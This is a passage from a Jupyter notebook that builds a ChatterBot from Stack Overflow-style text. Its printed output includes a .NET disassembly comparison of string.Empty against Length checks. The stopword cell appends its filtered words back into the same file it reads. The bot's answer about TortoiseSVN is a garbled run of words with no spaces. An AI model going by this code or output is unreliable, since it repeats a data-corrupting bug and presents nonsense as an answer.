)\\n00452443  mov         edx,dword ptr ds:[3282184h]\\n00452449  mov         ecx,dword ptr [ebp-50h]\\n0045244C  call        59DEC0B0        ; On return, EAX\\xa0=\\xa00x00000000.\\n00452451  mov         dword ptr [ebp-9Ch],eax\\n00452457  cmp         dword ptr [ebp-9Ch],0\\n0045245E  sete        al\\n00452461  movzx       eax,al\\n00452464  mov         dword ptr [ebp-64h],eax\\n00452467  cmp         dword ptr [ebp-64h],0\\n0045246B  jne         00452498\\n\\n\\nif ( strInstallString == string.Empty ) Isn\\'t Significantly Different\\n\\nif ( strInstallString.Length == 0 )\\n003E284B  mov         ecx,dword ptr [ebp-50h]\\n003E284E  cmp         dword ptr [ecx],ecx\\n003E2850  call        5ACBC87E        ; On return, EAX\\xa0=\\xa00x00000001.\\n003E2855  mov         dword ptr [ebp-9Ch],eax\\n003E285B  cmp         dword ptr [ebp-9Ch],0\\n003E2862  setne       al\\n003E2865  movzx       eax,al\\n003E2868  mov         dword ptr [ebp-64h],eax\\n003E286B  cmp         dword ptr [ebp-64h],0\\n003E286F  jne         003E289C\\n\\n\\nFrom the above machine code listings, generated by the NGEN module of the .NET Framework, version 4.5, I draw the following conclusions.\\n\\n\\nTesting for equality against the empty string literal and the static string.Empty property on the System.string class are, for all practical purposes, identical. The only difference between the two code snippets is the source of the first move instruction, and both are offsets relative to ds, implying that both refer to baked-in constants.\\nTesting for equality against the empty string, as either a literal or the string.Empty property, sets up a two-argument function call, which indicates inequality by returning zero. I base this conclusion on other tests that I performed a couple of months ago, in which I followed some of my own code across the managed/unmanaged divide and back. In all cases, any call that required two or more arguments put the first argument in register ECX, and and the second in register EDX. I don\\'t recall how subsequent arguments were passed. Nevertheless, the call setup looked more like __fastcall than __stdcall. Likewise, the expected return values always showed up in register EAX, which is almost universal.\\nTesting the length of the string sets up a one-argument function call, which returns 1 (in register EAX), which happens to be the length of the string being tested.\\nGiven that the immediately visible machine code is almost identical, the only reason that I can imagine that would account for the better performance of the string equality over the sting length reported by Shinny is that the two-argument function that performs the comparison is significantly better optimized than the one-argument function that reads the length off the string instance.\\n\\n\\nConclusion\\n\\nAs a matter of principle, I avoid comparing against the empty string as a literal, because the empty string literal can appear ambiguous in source code. To that end, my .NET helper classes have long defined the empty string as a constant. Though I use string.Empty for direct, inline comparisons, the constant earns its keep for defining other constants whose value is the empty string, because a constant cannot be assigned string.Empty as its value.\\n\\nThis exercise settles, once and for all, any concern I might have about the cost, if any, of comparing against either string.Empty or the constant defined by my helper classes.\\n\\nHowever, it also raises a puzzling question to replace it; why is comparing against string.Empty more efficient than testing the length of the string? Or is the test used by Shinny invalidated because by the way the loop is implemented? (I find that hard to believe, but, then again, I\\'ve been fooled before, as I\\'m sure you have, too!)\\n\\nI have long assumed that system.string objects were counted strings, fundamentally similar to the long established Basic String (BSTR) that we have long known from COM.\\n']]}\n"
     ]
    }
   ],
   "source": [
    "type(data_loaded)\n",
    "print(data_loaded)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import io\n",
    "import  re\n",
    "from nltk.corpus import stopwords\n",
    "from nltk.tokenize import word_tokenize\n",
    "#word_tokenize accepts a string as an input, not a file.\n",
    "stop_words = set(stopwords.words('english'))\n",
    "file1 = open(\"data.json\")\n",
    "line = file1.read()# Use this to read file content as a stream:\n",
    "words = line.split()\n",
    "for r in words:\n",
    "    print(r)\n",
    "    if not r in stop_words:\n",
    "        appendFile = open('data.json','a')\n",
    "        appendFile.write(\" \"+r)\n",
    "        appendFile.close()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "data.json Training: [####################] 100%\n"
     ]
    }
   ],
   "source": [
    "chatterbot.train(\"./data.json\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "pInnoparticularorderImaNETwebdeveloperifyoucanttellfromthelistpulliahrefhttpwwwjetbrainscomresharperrelnofollowResharperaKeepsmycodeslimandcleanliliahrefhttpwwwredgatecomproductsreflectorrelnofollowReflectoraEverynowandthenyouneedtofigureouthowthehecksomethingisworkingintheNETlibraryliliahrefhttpsaddonsmozillaorgenUSfirefoxaddon1843relnofollowFirebugaEverywebdeveloperhasthisinstalledbecauseitmakesmarkupandcssdebuggingemsoemmucheasierliliahrefhttptortoisesvntigrisorgrelnofollowTortoiseSVNaByfarthebestversioncontrolsystemIhaveeverusedAbsolutelynocomplaintsaboutitliliahrefhttpwwwnunitorgindexphprelnofollowNUnitaUnittestingthatdoesntgetinyourwayPlusitintegratesnicelywithResharperliliNotepadForwhateverreasonIcantshakethenostalgicfeelingIgetusingthisStillmygotoapplicationforseveralthingstodolistsquicksidenotesquickanddirtyclipboardetcliul\n"
     ]
    }
   ],
   "source": [
    "response = chatterbot.get_response(\"what is tortoise svn\")\n",
    "print(response)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "response = chatterbot.get_response(\"Are there any really good tutorials explaining branching and merging with Apache Subversion? \\n\\nAll the better if it's specific to TortoiseSVN client.\\n\")\n",
    "print(response)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
